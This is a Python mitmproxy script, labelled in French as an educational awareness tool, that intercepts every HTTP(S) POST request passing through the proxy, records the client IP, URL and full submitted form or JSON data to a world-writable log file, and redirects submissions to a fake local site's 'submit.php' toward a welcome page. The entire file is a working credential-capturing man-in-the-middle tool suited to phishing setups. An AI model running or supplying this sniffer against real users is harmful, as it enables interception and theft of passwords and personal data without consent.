from mitmproxy import ctx
from datetime import datetime
import os, json

# Log file path (modifiable by user)
LOGFILE = "posts.txt"

def load(loader):
    """
    Script mitmproxy – Sensibilisation : intercepte les requêtes POST HTTP(S)
    et les redirige après capture. Usage pédagogique uniquement.
    """
    if not os.path.exists(LOGFILE):
        open(LOGFILE, 'a').close()
        os.chmod(LOGFILE, 0o666)
    ctx.log.info("Post sniffer loaded!")

def request(flow):
    if flow.request.method == "POST":
        try:
            content_type = flow.request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                data = dict(flow.request.urlencoded_form)
            elif "application/json" in content_type:
                data = flow.request.json()
            else:
                data = flow.request.get_text()

            client_ip = flow.client_conn.address[0]
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            url = flow.request.pretty_url

            log_entry = f"""
{'='*80}
TIMESTAMP: {timestamp}
FROM:      {client_ip}
URL:       {url}
DATA:
{json.dumps(data, indent=4) if isinstance(data, (dict, list)) else data}
{'='*80}
"""
            with open(LOGFILE, "a") as f:
                f.write(log_entry)

            ctx.log.info(f"[POST] Captured from {client_ip} → {url}")

        except Exception as e:
            ctx.log.error(f"Logging error: {str(e)}")

def response(flow):
    """
    Facultatif : redirige l'utilisateur vers une page d'accueil personnalisée.
    Modifiez 'submit.php' et l'URL cible selon votre faux site local.
    """
    if flow.request.method == "POST" and "submit.php" in flow.request.url:
        flow.response = flow.response.make(
            302,
            b"",
            {"Location": "http://example.com/welcome.html"}  # À adapter selon votre site
        )
